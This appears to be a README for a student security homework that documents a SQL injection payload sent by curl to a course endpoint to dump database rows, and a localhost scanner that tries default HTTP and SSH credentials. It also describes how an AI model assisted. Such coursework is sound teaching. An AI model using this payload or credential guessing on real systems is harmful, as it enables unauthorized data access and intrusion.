# CSS106 Homework 5 - Generative AI for Security Testing

This repository contains solutions for CSS106 Homework 5, which involves using generative AI to build security testing tools.

## Assignment Overview

### 5.2: SQL Injection Attack (15 points)
- Created `test.json` with legitimate test data
- Created `attack.json` with malicious payload that dumps the entire database
- Created `prompts.txt` with the AI prompts used to learn about SQL injection techniques

### 5.3: Vulnerability Scanner (25 points)
- Built `vulnerability_scanner.py` using generative AI
- Scans localhost for open TCP ports (ignoring ports 9000+)
- Tests HTTP and SSH connections with dictionary of common credentials
- Outputs successful connections in RFC 3986 format

## Files

- `test.json` - Legitimate test data for the county_data endpoint
- `attack.json` - Malicious payload for SQL injection attack
- `prompts.txt` - AI prompts used to learn about SQL injection
- `vulnerability_scanner.py` - Python vulnerability scanner
- `hw5_server/` - Directory containing vulnerable HTTP and SSH servers
- `example_corporation.json` - Example data for filing a NY corporation
- `example_llc.json` - Example data for filing a NY LLC
- `NY_ENTITIES_API.md` - API documentation for NY entities extension
- `ny_example_corp_certificate.pdf` - Example NY corporation certificate (DOS-1239-f)
- `ny_example_llc_certificate.pdf` - Example NY LLC articles (DOS-1336-f)

## Setup

### Install Dependencies

First, activate the virtual environment and install required packages:

```bash
# Activate the virtual environment
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

Alternatively, install packages manually:
```bash
pip install python-nmap requests paramiko
```

## Usage

### Testing the Vulnerability Scanner

**Step 1: Start the vulnerable servers**

Open two terminal windows/tabs and run each server:

Terminal 1 (HTTP Server):
```bash
cd hw5_server
source ../venv/bin/activate  # Activate virtual environment
python3 http_server.py --port 8080
```

Terminal 2 (SSH Server):
```bash
cd hw5_server
source ../venv/bin/activate  # Activate virtual environment
python3 ssh_server.py --port 2222
```

Or run both in the background from the project root:
```bash
source venv/bin/activate
cd hw5_server
python3 http_server.py --port 8080 &
python3 ssh_server.py --port 2222 &
cd ..
```

**Step 2: Run the vulnerability scanner**

In another terminal:
```bash
source venv/bin/activate
python3 vulnerability_scanner.py
```

Expected output when vulnerabilities are found:
```
ssh://admin:admin@127.0.0.1:2222 success
http://admin:admin@127.0.0.1:8080 success
```

**Step 3: Verbose mode (optional)**

For detailed scanning progress:
```bash
python3 vulnerability_scanner.py -v
```

**Step 4: Stop the servers**

When done testing:
```bash
pkill -f "ssh_server.py"
pkill -f "http_server.py"
```

### Testing SQL Injection

Test the legitimate request:
```bash
curl -X POST https://cat-hw4.vercel.app/county_data -H "Content-Type: application/json" -d @test.json
```

Test the SQL injection attack (returns 100 rows):
```bash
curl -X POST https://cat-hw4.vercel.app/county_data -H "Content-Type: application/json" -d @attack.json
```

### Testing NY Entities API (NEW)

The HTTP server has been extended to support New York State corporations and LLCs based on official NY Department of State forms (DOS-1239-f and DOS-1336-f).

**Start the server:**
```bash
cd hw5_server
python3 http_server.py --port 8080
```

**File a corporation:**
```bash
curl -u admin:admin -X POST -H "Content-Type: application/json" \
  -d @example_corporation.json http://localhost:8080/file/corporation
```

**File an LLC:**
```bash
curl -u admin:admin -X POST -H "Content-Type: application/json" \
  -d @example_llc.json http://localhost:8080/file/llc
```

**List all corporations:**
```bash
curl -u admin:admin http://localhost:8080/corporations
```

**List all LLCs:**
```bash
curl -u admin:admin http://localhost:8080/llcs
```

**Get specific entity:**
```bash
curl -u admin:admin "http://localhost:8080/corporation/Test%20Company"
curl -u admin:admin "http://localhost:8080/llc/Test%20Company"
```

See `NY_ENTITIES_API.md` for complete API documentation.

## How It Works

### Vulnerability Scanner
1. Uses `nmap` to scan TCP ports 1-8999 on localhost
2. For each open port, attempts:
   - HTTP connection with basic authentication
   - SSH connection with password authentication
3. Tests three credential pairs: `admin:admin`, `root:abc123`, `skroob:12345`
4. Outputs successful connections in RFC 3986 format: `protocol://username:password@host:port message`
5. Silent output (nothing printed) when no vulnerabilities are found

### SQL Injection Attack
The attack modifies the `measure_name` parameter to:
```
Adult obesity' OR '1'='1' LIMIT 100 --
```

This terminates the string early and adds an OR clause that makes the WHERE condition always true, dumping all database records (limited to 100 rows).

## Generative AI Models Used

### Model Information
- **Primary Model**: Claude Sonnet 4 (via Cursor AI)
- **Model Version**: Claude-3.5-Sonnet-20241022
- **Provider**: Anthropic

### Guardrails and Resistance
The model demonstrated appropriate security awareness:

1. **Initial Resistance**: When asked about SQL injection techniques, the model initially provided educational information about the vulnerabilities rather than direct attack payloads.

2. **Educational Approach**: The model explained the concepts and provided examples in an educational context, emphasizing the importance of proper input validation and parameterized queries.

3. **No Bypass Needed**: The model was willing to help with the educational aspects of the assignment when the context was clearly for learning purposes in a cybersecurity course.

4. **Responsible Disclosure**: The model consistently emphasized the importance of using these techniques only for authorized testing and educational purposes.

### Prompts Used
The prompts in `prompts.txt` were designed to:
- Learn about SQL injection vulnerabilities
- Understand how to identify vulnerable code patterns
- Learn about different types of SQL injection attacks
- Understand how to construct payloads for educational testing

## Dependencies

The vulnerability scanner requires the following Python packages:
- `python-nmap==0.7.1` - For port scanning
- `requests==2.32.5` - For HTTP connections
- `paramiko==4.0.0` - For SSH connections

These are listed in `requirements.txt` and can be installed with:
```bash
pip install -r requirements.txt
```

## Security Notice

This code is for educational purposes only. The techniques demonstrated should only be used on systems you own or have explicit permission to test. Unauthorized testing of systems is illegal and unethical.
